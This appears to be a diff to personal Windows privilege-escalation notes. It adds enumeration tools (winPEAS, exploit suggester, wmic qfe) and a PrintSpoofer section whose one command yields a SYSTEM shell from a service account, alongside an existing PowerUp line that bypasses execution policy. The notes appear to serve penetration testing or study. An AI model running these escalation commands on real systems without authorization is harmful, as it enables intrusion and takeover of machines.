@@ -1,6 +1,13 @@
 Windows
+----------------------------------------
+Local Enumeration
 
-Enumeration
+winpeas.exe
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo_you_collected.txt
+or
+wmic qfe
+
+----------------------------------------------
 
 # PowerView/PowerSploit        https://github.com/PowerShellMafia/PowerSploit/tree/master
 powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
@@ -161,3 +168,14 @@ dir /R <===============================to find fidden files===to get the content
 find / -writebale -type d 2>/dev/null <================finds world writeble directories
 where /R c:\windows bash.exe <===this command searches for bash.exe in windows folder===>
 dir c:\utils\*.*  or  gci c:\utils -Force 
+
+----------------------------------
+                                   |PrintSpoofer|
+                                   ============ 
+exploit that can be used to escalate service user permissions on Windows Server 2016, Server 2019, and Windows 10.
+To escalate privileges, the service account must have SeImpersonate privileges. To execute:
+
+PrintSpoofer.exe -i -c cmd
+
+With appropriate privileges this should grant system user shell access.
+----------------------------------------------------------------------------
